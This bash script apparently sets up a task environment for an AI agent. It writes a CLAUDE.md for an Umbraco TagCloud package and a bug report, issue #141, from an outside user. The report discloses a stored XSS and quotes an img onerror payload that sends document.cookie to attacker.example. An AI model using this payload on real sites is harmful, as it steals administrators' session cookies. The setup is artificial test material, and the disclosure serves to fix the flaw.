#!/usr/bin/env bash
set -euo pipefail
cat > CLAUDE.md <<'EOF'
# Umbraco.Community.TagCloud

An Umbraco package (C# plus a Lit backoffice client).

## Issue tracker

- Type: GitHub Issues
- Location: this repo, `jodean/Umbraco.Community.TagCloud`
- Access: `gh`
- State labels: the defaults
- Proposal answers: start a comment with 🤖
EOF
cat > ISSUE-141.md <<'EOF'
# #141: Tag names run as script in the backoffice

Opened by @drift-z (not on the team)

If a writer saves a tag named `<img src=x onerror="fetch('https://attacker.example/c?'+document.cookie)">`
then every admin who opens the Tag Cloud dashboard sends their session cookie to that URL.
Tested on 3.2.0.
EOF
